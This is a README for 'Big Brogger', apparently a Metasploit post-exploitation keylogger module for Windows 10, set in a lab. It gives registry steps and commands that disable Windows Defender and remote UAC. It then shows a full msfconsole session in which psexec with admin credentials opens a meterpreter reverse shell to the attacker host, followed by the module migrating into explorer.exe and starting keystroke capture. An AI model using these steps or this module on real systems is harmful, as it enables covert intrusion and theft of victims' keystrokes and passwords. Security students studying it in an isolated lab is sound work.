# Big Brogger
A Metasploit module that captures keystrokes on compromised Windows machines.

## Requirements
- Kali Linux virtual machine with Metasploit
- Windows 10 virtual machine

## Getting Started
Before attacking, you need to install and make the Windows machine vulnerable. You can find a guide to help you [here](https://medium.com/@bmatth21/how-to-setup-windows-10-vm-lab-for-hacking-608592d550f2).

### Disabling Windows Defender Real-Time Protection

In order to proceed effectively with the post-exploitation module, it's essential to disable Windows Defender's real-time protection. There are two methods to achieve this:

1. **Via Windows Security Interface:**
    - Navigate to `Windows Security > Virus & threat protection > Real-time protection`. Please note that this method only disables real-time protection temporarily.

2. **Via Registry Editor:**
    - Press `Windows + R` to open the Run dialog.
    - Type `regedit` and hit Enter to open the Registry Editor.
    - Navigate to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`.
    - Create a new DWORD (32-bit) value named `DisableAntiSpyware` and set its value to `1`.


### Disabling Remote UAC (User Account Control)

To complete the setup, it's crucial to disable Remote UAC. Follow these steps:

1. **Open a Command Prompt as Administrator:**
    - Right-click on the Command Prompt icon.
    - Select "Run as administrator".

2. **Execute the Following Command:**
    ```
    REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
    ```
    This command will modify the registry to disable Remote UAC.

## How to use
This a post module so you will have to get access to the Windows machine. You can do it by any means but we will use `windows/smb/psexec` in Metasploit for the demonstration.

First, use psexec to get a session with a valid credential:
```
msf > use windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set RHOST 10.0.2.15
RHOST => 10.0.2.15
msf exploit(windows/smb/psexec) > set SMBUser admin
SMBUser => admin
msf exploit(windows/smb/psexec) > set SMBPass admin
SMBPass => admin
msf exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.0.2.4:4444
[*] 10.0.2.15:445 - Connecting to the server...
[*] 10.0.2.15:445 - Authenticating to 10.0.2.15:445 as user 'admin'...
[*] 10.0.2.15:445 - Selecting PowerShell target
[*] 10.0.2.15:445 - Executing the payload...
[*] Sending stage (175686 bytes) to 10.0.2.15
[+] 10.0.2.15:445 - Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.15:49870) at 2024-03-23 22:38:49 +0100

meterpreter >
```

Then, you can background the meterpreter session and run the keylogger:
```
msf6 exploit(windows/smb/psexec) > use xtests/big_brogger
msf6 post(xtests/big_brogger) > set SESSION 1
SESSION => 1
msf6 post(xtests/big_brogger) > run

[*] Migrating to explorer.exe...
[+] Successfully migrated to explorer.exe.
[*] Keylogger started...
```

To exit, simply press `Ctrl+C`.